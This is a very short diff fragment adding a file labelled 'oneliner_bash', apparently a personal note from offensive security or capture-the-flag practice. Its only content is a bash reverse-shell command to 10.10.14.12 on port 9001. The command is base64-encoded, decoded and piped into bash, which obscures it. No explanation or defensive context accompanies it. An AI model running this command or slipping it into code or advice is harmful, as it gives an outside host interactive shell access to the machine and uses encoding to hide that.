@@ -1,0 +1,3 @@
+oneliner_bash
+
+echo $(echo 'bash -i >& /dev/tcp/10.10.14.12/9001 0>&1' | base64) | base64 -d | bash
